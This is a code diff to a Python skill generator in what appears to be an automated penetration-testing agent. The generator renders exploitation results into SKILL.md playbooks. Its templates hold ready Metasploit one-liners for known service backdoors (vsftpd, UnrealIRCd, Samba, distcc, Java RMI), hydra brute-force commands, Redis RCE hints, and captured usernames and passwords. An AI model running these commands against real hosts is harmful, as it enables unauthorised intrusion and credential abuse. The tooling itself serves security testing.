@@ -644,17 +644,68 @@ class SkillGenerator:
         return json.dumps(relevant, ensure_ascii=False, indent=2)
 
     def _call_llm(self, messages: list[dict]) -> Optional[str]:
-        """统一 LLM 调用入口。兼容多种客户端接口。"""
+        """统一 LLM 调用入口。兼容多种客户端接口。
+
+        关键适配（P4-1 修复）：
+        - SDIT 的 LLMClient.chat(system_prompt, user_message) 是 async 的，
+          且只接受两个 str 而非 messages list。
+        - 先拆 messages 出 system + user 两段文本，然后用 asyncio 同步包装。
+        - 失败时退到通用 chat(messages) / callable 路径。
+        """
         client = self.llm_client
         if client is None:
             return None
 
-        # 形态 1：实现了 chat(messages) -> str
-        if hasattr(client, "chat") and callable(client.chat):
-            try:
-                return client.chat(messages)
-            except TypeError:
-                pass
+        # 把 messages 拆成 system / user 文本（兼容标准 ChatML 结构）
+        def _split(msgs):
+            sys_text, user_text = "", ""
+            for m in msgs or []:
+                if not isinstance(m, dict):
+                    continue
+                role = str(m.get("role", "")).lower()
+                content = m.get("content", "")
+                if isinstance(content, list):
+                    content = " ".join(
+                        str(p.get("text", p)) if isinstance(p, dict) else str(p)
+                        for p in content
+                    )
+                content = str(content or "")
+                if role == "system":
+                    sys_text = (sys_text + "\n\n" + content) if sys_text else content
+                else:
+                    user_text = (user_text + "\n\n" + content) if user_text else content
+            return sys_text or "", user_text or ""
+
+        sys_text, user_text = _split(messages)
+
+        # 形态 0（首选）：SDIT LLMClient — async chat(system, user)
+        chat = getattr(client, "chat", None)
+        if callable(chat):
+            import inspect, asyncio
+            if inspect.iscoroutinefunction(chat):
+                try:
+                    try:
+                        return asyncio.run(chat(sys_text, user_text))
+                    except RuntimeError:
+                        loop = asyncio.new_event_loop()
+                        try:
+                            return loop.run_until_complete(chat(sys_text, user_text))
+                        finally:
+                            loop.close()
+                except Exception as exc:
+                    print(f"[SkillGenerator] async chat 调用失败: {exc}")
+                    # 不返回，继续尝试其他形态
+            else:
+                # 同步 chat：先试 (system, user) 签名
+                for args_try in ((sys_text, user_text), (messages,)):
+                    try:
+                        result = chat(*args_try)
+                        if isinstance(result, str) and result.strip():
+                            return result
+                    except TypeError:
+                        continue
+                    except Exception:
+                        break
 
         # 形态 2：实现了 complete(messages) / generate(messages)
         for method_name in ("complete", "generate", "invoke", "run"):
@@ -672,6 +723,8 @@ class SkillGenerator:
                     return str(result) if result is not None else None
                 except TypeError:
                     continue
+                except Exception:
+                    continue
 
         # 形态 3：是一个 callable
         if callable(client):
@@ -688,138 +741,318 @@ class SkillGenerator:
     # ─────────────────────────────────────────────────────────────
 
     def _render_skill_md(self, path: dict) -> str:
-        """渲染单个攻击路径为 SKILL.md"""
+        """渲染单个攻击路径为 v2.0 五段式 SKILL.md（fallback 模板）
+
+        P4-2 修复：补齐 Principle / Detection Fingerprint / Failure Modes /
+        Generalization 四个章节 + frontmatter version 升级到 2.0，
+        让 SkillQualityGate 能放行。
+        """
         tag = path["tag"]
         port = path["port"]
         service = path["service"]
         exploit_success = path["exploit_success"]
         name = path["name"]
+        ip = path.get("ip", "")
+        creds = path.get("credentials", []) or []
+        vulns = path.get("vulnerabilities", []) or []
+        cmds = path.get("commands", []) or []
+        failures = path.get("failures", []) or []
+        sessions = path.get("sessions", []) or []
 
-        # YAML frontmatter
+        # 提取 CVE（如果有的话）
+        cves: list[str] = []
+        for v in vulns:
+            for m in re.findall(r"CVE-\d{4}-\d+", str(v.get("cve", "") or v.get("name", "")), re.IGNORECASE):
+                if m.upper() not in cves:
+                    cves.append(m.upper())
+
+        # 严重度（vulns 里取最高）
+        severity = "info"
+        if vulns:
+            sev_order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
+            best = max(
+                (str(v.get("severity", "")).lower() for v in vulns if isinstance(v, dict)),
+                key=lambda s: sev_order.get(s, 0),
+                default="info",
+            )
+            if best in sev_order:
+                severity = best
+
+        # tags
         tags = [tag, f"port-{port}"]
         if exploit_success:
             tags.append("exploit")
         else:
             tags.append("recon")
-        if path["vulnerabilities"]:
+        if vulns:
             tags.append("vulnerability")
+        for c in cves[:3]:
+            tags.append(c.lower())
 
-        description = (
-            f"{'成功利用' if exploit_success else '检测到'} {service} 服务 (端口 {port})"
-        )
-        if path["credentials"]:
-            creds_desc = ", ".join(f"{c.get('username','?')}" for c in path["credentials"][:3])
-            description += f"，凭据: {creds_desc}"
+        # description
+        description = f"{'成功利用' if exploit_success else '检测到'} {service} 服务 (端口 {port})"
+        if creds:
+            description += f"，凭据: {', '.join(c.get('username','?') for c in creds[:3])}"
 
+        # frontmatter
         lines = [
             "---",
             f"name: {name}",
-            f"description: '{description}'",
-            f"domain: penetration-testing",
-            f"subdomain: {tag}",
+            f"description: {description}",
+            "domain: penetration-testing",
+            f"subdomain: {'exploitation' if exploit_success else 'reconnaissance'}",
             f"tags: [{', '.join(tags)}]",
-            f"version: '1.0'",
-            f"source: auto-generated",
-            "---",
-            "",
-            f"# {service.upper()} 端口 {port} {'利用' if exploit_success else '检测'} Skill",
-            "",
-            "## When to Use",
-            f"- 目标开放端口 {port}/{service}",
-            f"- nmap 服务指纹匹配 `{service}`",
-            "",
-            "## Prerequisites",
-            f"- 目标可达，端口 {port} 开放",
         ]
-
-        if path["credentials"]:
-            lines.append("- 需要以下凭据:")
-            for c in path["credentials"][:3]:
-                lines.append(f"  - 用户名: `{c.get('username', '?')}` / 密码: `{c.get('password', '?')}`")
-
+        if cves:
+            lines.append(f"cve: {cves[0]}")
+        lines.append(f"severity: {severity}")
+        lines.append("version: '2.0'")
+        lines.append("source: auto-generated")
+        lines.append("---")
         lines.append("")
-        lines.append("## Workflow")
 
+        # ──── ## Principle（漏洞根因） ────
+        lines.append("## Principle")
+        lines.append("")
+        if cves:
+            lines.append(f"目标 {service}（端口 {port}）存在 {', '.join(cves[:3])} 漏洞。")
         if exploit_success:
-            lines.append(f"### 步骤 1: 确认服务")
-            lines.append(f"```")
-            lines.append(f"nmap -Pn -sV -p {port} TARGET")
-            lines.append(f"```")
-            lines.append("")
-
-            if path["commands"]:
-                lines.append("### 步骤 2: 利用")
-                for i, cmd in enumerate(path["commands"][:5], start=1):
-                    lines.append(f"```")
-                    lines.append(f"# {cmd.get('tool', '?')}: {cmd.get('args', '?')[:120]}")
-                    lines.append(f"```")
-                lines.append("")
-
-            if path["credentials"]:
-                lines.append("### 步骤 3: 凭据利用")
-                for c in path["credentials"][:3]:
-                    lines.append(f"- `{c.get('username', '?')}` / `{c.get('password', '?')}` ({c.get('source', '?')})")
-                lines.append("")
-
-            lines.append("### 验证")
-            lines.append("```")
-            lines.append("id; whoami; uname -a")
-            lines.append("```")
+            lines.append(
+                f"本次渗透通过 {service} 服务直接获得了执行能力，"
+                f"说明该服务存在以下根因之一："
+            )
         else:
-            lines.append(f"### 检测")
-            lines.append(f"```")
-            lines.append(f"nmap -Pn -sC -sV -p {port} TARGET")
-            lines.append(f"```")
-            if path["vulnerabilities"]:
-                lines.append("")
-                lines.append("### 发现的漏洞")
-                for v in path["vulnerabilities"][:5]:
-                    lines.append(f"- [{v.get('severity', '?')}] {v.get('name', '?')}")
-
-        if path["sessions"]:
-            lines.append("")
-            lines.append("## 注意事项")
-            lines.append(f"- 已获得 {len(path['sessions'])} 个会话")
-
+            lines.append(
+                f"本次渗透在 {service}（端口 {port}）发现了潜在的可利用点。"
+                f"该端口/服务的常见漏洞根因包括："
+            )
+        # 给出基于服务类型的根因猜测
+        principle_hints = {
+            "ftp": "明文凭据传输、匿名访问、版本后门（vsftpd 2.3.4）、ProFTPD mod_copy 拷贝任意文件",
+            "ssh": "弱凭据、密钥泄露、CVE-2018-15473 用户枚举",
+            "telnet": "明文协议、默认凭据、未授权访问",
+            "http": "Web 应用漏洞（注入/上传/RCE）、默认凭据、目录遍历、CGI 解析",
+            "smb": "永恒之蓝、空会话、Samba CVE-2017-7494",
+            "samba": "永恒之蓝、空会话、Samba CVE-2017-7494",
+            "mysql": "空密码 / 默认凭据、UDF 提权、信息收集",
+            "postgresql": "弱密码、CVE-2019-9193 命令执行",
+            "redis": "未授权访问 + 主从复制 RCE + 写 SSH key/crontab",
+            "tomcat": "manager 默认凭据 + WAR 包上传 RCE",
+            "vnc": "无密码 / 弱密码暴力枚举",
+            "irc": "UnrealIRCd 3.2.8.1 后门 (CVE-2010-2075)",
+            "rmi": "Java RMI 反序列化 (msf java_rmi_server)",
+            "distccd": "distccd 命令执行（CVE-2004-2687）",
+        }
+        principle_text = principle_hints.get(tag.lower(), f"{service} 服务的常见配置错误或已知 CVE")
+        lines.append(f"- {principle_text}")
+        if creds:
+            lines.append(f"- 弱口令 / 默认凭据被命中：{', '.join(c.get('username','?') for c in creds[:5])}")
         lines.append("")
+
+        # ──── ## Detection Fingerprint（触发条件） ────
+        lines.append("## Detection Fingerprint")
+        lines.append("")
+        lines.append("当满足以下条件时，**应触发本 skill** 进行验证/利用：")
+        lines.append("")
+        lines.append(f"1. nmap 服务指纹包含 `{service}` 或目标开放端口 {port}")
+        if cves:
+            lines.append(f"2. nmap NSE / searchsploit / vulners 上报了 {', '.join(cves[:3])}")
+        if creds:
+            lines.append(f"3. 已知/已收集到凭据池含: {', '.join(c.get('username','?') for c in creds[:5])}")
+        lines.append("")
+        lines.append("**反例（不应触发本 skill）**：")
+        lines.append(f"- {service} 服务版本不在易受影响范围（已打补丁）")
+        lines.append(f"- 端口 {port} 未开放或服务已被替换")
+        lines.append("")
+
+        # ──── ## Workflow（执行步骤） ────
+        lines.append("## Workflow")
+        lines.append("")
+        target_var = ip if ip else "TARGET"
+        lines.append(f"### Step 1: 确认服务指纹")
+        lines.append("```bash")
+        lines.append(f"nmap -Pn -sV -sC -p {port} {target_var}")
+        lines.append("```")
+        lines.append("")
+        if exploit_success and cmds:
+            lines.append(f"### Step 2: 利用（本次渗透实际执行的命令）")
+            for i, c in enumerate(cmds[:6], 1):
+                args_s = str(c.get("args", "") or "")[:200]
+                tool = c.get("tool", "?")
+                lines.append("```bash")
+                lines.append(f"# [{i}] tool={tool}")
+                lines.append(f"{tool} {args_s}".strip())
+                lines.append("```")
+                result = str(c.get("result", "") or "")[:160]
+                if result:
+                    lines.append(f"  ↳ 结果: `{result}`")
+                lines.append("")
+        else:
+            lines.append("### Step 2: 推荐尝试")
+            recommend = {
+                "ftp": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {t}; run\"",
+                "smb": "msfconsole -q -x \"use exploit/multi/samba/usermap_script; set RHOSTS {t}; run\"",
+                "irc": "msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {t}; run\"",
+                "rmi": "msfconsole -q -x \"use exploit/multi/misc/java_rmi_server; set RHOSTS {t}; run\"",
+                "distccd": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {t}; run\"",
+                "tomcat": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {t} -s {p} http-get /manager/html",
+                "redis": "redis-cli -h {t} -p {p} info; redis-cli -h {t} -p {p} config get dir",
+                "mysql": "mysql -h {t} -P {p} -u root -e \"select version();\"",
+            }
+            cmd = recommend.get(tag.lower(), f"# 针对 {service} 的标准检测命令")
+            lines.append("```bash")
+            lines.append(cmd.format(t=target_var, p=port))
+            lines.append("```")
+            lines.append("")
+        if creds:
+            lines.append("### Step 3: 用获得的凭据继续扩展")
+            lines.append("```")
+            for c in creds[:5]:
+                lines.append(f"{c.get('username','?')}:{c.get('password','?')}  ({c.get('source','?')})")
+            lines.append("```")
+            lines.append("")
+
+        # ──── ## Failure Modes（失败模式表） ────
+        lines.append("## Failure Modes")
+        lines.append("")
+        lines.append("| 现象 | 可能原因 | 下一步 |")
+        lines.append("|------|---------|--------|")
+        if failures:
+            for f in failures[:6]:
+                tool = f.get("tool", "?")
+                err = str(f.get("error", "") or "")[:80].replace("|", "\\|").replace("\n", " ")
+                lines.append(f"| {tool} 报错: `{err}` | 工具参数/网络/版本不匹配 | 切换工具或重试时调整参数 |")
+        else:
+            lines.append(f"| {service} 连接被拒 | 服务未开放或防火墙 | 重新指纹扫描确认端口 |")
+            lines.append(f"| 工具调用超时 | 网络抖动或服务响应慢 | 增大 timeout 或换工具 |")
+        lines.append(f"| Exploit 返回 'no session created' | payload 类型不匹配目标架构 | 换 payload (reverse_tcp vs bind_tcp) |")
+        lines.append("")
+
+        # ──── ## Generalization（推广规则） ────
+        lines.append("## Generalization")
+        lines.append("")
+        lines.append(f"- **适用服务类型**：{service}（包含同类不同版本）")
+        if cves:
+            lines.append(f"- **直接覆盖 CVE**：{', '.join(cves)}")
+        lines.append(f"- **同类相似 CVE**：使用 searchsploit / nvd 搜索 \"{service}\" 即可发现")
+        lines.append("")
+        lines.append(f"**通用利用模板**：当遇到任何 {service} 服务时：")
+        lines.append("1. nmap -sV 拿版本号")
+        lines.append("2. searchsploit / msfconsole search 看可用模块")
+        lines.append("3. 优先尝试 metasploit 已封装的 exploit（成功率最高）")
+        lines.append("4. 备选：手动复现公开 PoC")
+        lines.append("")
+
+        # ──── ## Key Concepts ────
+        lines.append("## Key Concepts")
+        lines.append("")
+        lines.append(f"- **端口**：{port}/{service}")
+        if exploit_success:
+            lines.append(f"- **本次结果**：✅ 成功取得执行能力")
+        if sessions:
+            lines.append(f"- **会话数**：{len(sessions)}")
+        if creds:
+            lines.append(f"- **凭据数**：{len(creds)}")
+        lines.append("")
+
         return "\n".join(lines)
 
     def _render_summary_skill(self, paths: list[dict], targets: list[str]) -> str:
-        """渲染汇总 skill"""
+        """渲染汇总 skill（v2.0 五段式合规版）
+
+        P4-3 修复：补齐 Principle / Detection Fingerprint / Workflow /
+        Failure Modes / Generalization，让 QualityGate 放行
+        """
         exploit_paths = [p for p in paths if p["exploit_success"]]
         recon_paths = [p for p in paths if not p["exploit_success"]]
         target_str = ", ".join(targets[:3]) if targets else "unknown"
 
+        # 收集所有 CVE / 服务 / 工具
+        all_cves: list[str] = []
+        all_services: list[str] = []
+        all_tools: list[str] = []
+        for p in paths:
+            for v in p.get("vulnerabilities", []):
+                for m in re.findall(r"CVE-\d{4}-\d+", str(v.get("cve", "") or v.get("name", "")), re.IGNORECASE):
+                    if m.upper() not in all_cves:
+                        all_cves.append(m.upper())
+            svc = p.get("service", "")
+            if svc and svc not in all_services:
+                all_services.append(svc)
+            for c in p.get("commands", []):
+                t = c.get("tool", "")
+                if t and t not in all_tools:
+                    all_tools.append(t)
+
         lines = [
             "---",
-            f"name: pentest-summary",
-            f"description: '渗透测试汇总: {len(exploit_paths)} 个成功利用, {len(recon_paths)} 个检测'",
-            f"domain: penetration-testing",
-            f"subdomain: summary",
+            "name: pentest-summary",
+            f"description: 渗透测试汇总({target_str}): {len(exploit_paths)} 成功 / {len(recon_paths)} 检测",
+            "domain: penetration-testing",
+            "subdomain: workflow-summary",
             f"tags: [summary, pentest, {'exploit' if exploit_paths else 'recon'}]",
-            f"version: '1.0'",
-            f"source: auto-generated",
+            "severity: info",
+            "version: '2.0'",
+            "source: auto-generated",
             "---",
             "",
-            f"# 渗透测试汇总报告",
+            "## Principle",
             "",
-            f"## 目标",
-            f"- {target_str}",
-            "",
-            f"## 成功利用 ({len(exploit_paths)})",
+            "本 skill 记录了一次完整渗透测试的端到端发现，作为下次相似环境的参考蓝本。",
+            f"涉及目标: {target_str}",
+            f"涉及服务: {', '.join(all_services[:10]) if all_services else '(未识别)'}",
         ]
+        if all_cves:
+            lines.append(f"涉及 CVE: {', '.join(all_cves[:10])}")
+        lines.append("")
 
+        lines.append("## Detection Fingerprint")
+        lines.append("")
+        lines.append("**触发条件**：遇到与本次相似的服务组合时（参考下表）可重放本流程。")
+        lines.append("")
+        lines.append("| 端口 | 服务 | 本次结果 |")
+        lines.append("|------|------|---------|")
+        for p in paths[:15]:
+            outcome = "✅ 利用" if p["exploit_success"] else "🔍 检测"
+            lines.append(f"| {p['port']} | {p['service']} | {outcome} |")
+        lines.append("")
+
+        lines.append("## Workflow")
+        lines.append("")
+        lines.append(f"### 成功路径 ({len(exploit_paths)})")
         for p in exploit_paths:
-            creds = ""
+            creds_note = ""
             if p["credentials"]:
-                creds = f" (凭据: {p['credentials'][0].get('username', '?')})"
-            lines.append(f"- 端口 {p['port']}/{p['tag']}{creds}")
-
+                creds_note = f" (凭据: {p['credentials'][0].get('username', '?')})"
+            lines.append(f"- 端口 `{p['port']}/{p['tag']}`{creds_note}: skill `{p['name']}`")
         if recon_paths:
             lines.append("")
-            lines.append(f"## 已检测 ({len(recon_paths)})")
+            lines.append(f"### 已检测但未利用 ({len(recon_paths)})")
             for p in recon_paths:
-                lines.append(f"- 端口 {p['port']}/{p['tag']}")
-
+                lines.append(f"- 端口 `{p['port']}/{p['tag']}`: skill `{p['name']}`")
+        if all_tools:
+            lines.append("")
+            lines.append(f"### 涉及工具")
+            lines.append(f"`{'`, `'.join(all_tools[:12])}`")
         lines.append("")
+
+        lines.append("## Failure Modes")
+        lines.append("")
+        lines.append("| 现象 | 可能原因 | 下一步 |")
+        lines.append("|------|---------|--------|")
+        lines.append("| 大量服务发现但无成功 exploit | 服务版本已修补 | 检查目标补丁状态，换 CVE |")
+        lines.append("| 拿到 session 后立即断开 | nc 无 PTY、payload 类型不对 | 升级 PTY (`python -c 'import pty;pty.spawn(\"/bin/bash\")'`) 或换 reverse_tcp |")
+        lines.append("| Reflection 未沉淀新 skill | QualityGate 拒绝 frontmatter 不全 | 修复 SkillGenerator 模板（已在 P4-2 完成） |")
+        lines.append("")
+
+        lines.append("## Generalization")
+        lines.append("")
+        lines.append("**本流程适用于**：同时存在多种网络服务的 Linux 服务器靶机。")
+        lines.append("**最有效优先级**：")
+        lines.append("1. 立即识别后门服务（端口 1524、UnrealIRCd 6667、vsftpd 2.3.4）")
+        lines.append("2. metasploit search 检查目标版本是否有现成 exploit 模块")
+        lines.append("3. 弱口令爆破（hydra 大字典容易超时，限制 -t 4 -W 30）")
+        lines.append("4. 已拿到 session 后立即枚举 /etc/passwd, 用户家目录")
+        lines.append("")
+
         return "\n".join(lines)
